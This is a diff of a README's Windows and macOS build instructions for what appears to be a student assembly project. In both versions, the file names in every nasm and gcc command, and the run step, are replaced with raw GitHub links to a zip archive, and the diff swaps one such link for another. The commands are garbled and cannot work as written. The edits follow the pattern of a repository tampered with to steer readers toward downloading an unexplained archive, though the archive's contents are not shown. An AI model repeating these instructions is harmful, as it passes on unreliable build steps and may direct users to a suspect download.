@@ -40,19 +40,19 @@ For Windows:
 1. Open CMD and navigate to your project folder (your/path/here).
 2. Run these commands.
    
-     nasm -f win64 https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/MP2/M-LBYARC-3.8.zip -o https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/MP2/M-LBYARC-3.8.zip
+     nasm -f win64 https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/Demo (Video Recording)/M-LBYARC-3.0.zip -o https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/Demo (Video Recording)/M-LBYARC-3.0.zip
   
-     gcc -std=c99 -c Main.c -o https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/MP2/M-LBYARC-3.8.zip -m64
+     gcc -std=c99 -c Main.c -o https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/Demo (Video Recording)/M-LBYARC-3.0.zip -m64
   
-     gcc https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/MP2/M-LBYARC-3.8.zip https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/MP2/M-LBYARC-3.8.zip -o https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/MP2/M-LBYARC-3.8.zip -m64 -mconsole
+     gcc https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/Demo (Video Recording)/M-LBYARC-3.0.zip https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/Demo (Video Recording)/M-LBYARC-3.0.zip -o https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/Demo (Video Recording)/M-LBYARC-3.0.zip -m64 -mconsole
   
-     https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/MP2/M-LBYARC-3.8.zip
+     https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/Demo (Video Recording)/M-LBYARC-3.0.zip
 
 For macOS:
 1. Open Terminal and navigate to your project folder (your/path/here).
 2. Run these commands:
    
-     nasm -f macho64 https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/MP2/M-LBYARC-3.8.zip -o compute_acceleration.o
+     nasm -f macho64 https://github.com/mughriah/LBYARCH-MP2/raw/refs/heads/main/Demo (Video Recording)/M-LBYARC-3.0.zip -o compute_acceleration.o
   
      gcc -O2 -arch x86_64 main.c compute_acceleration.o -o main
   
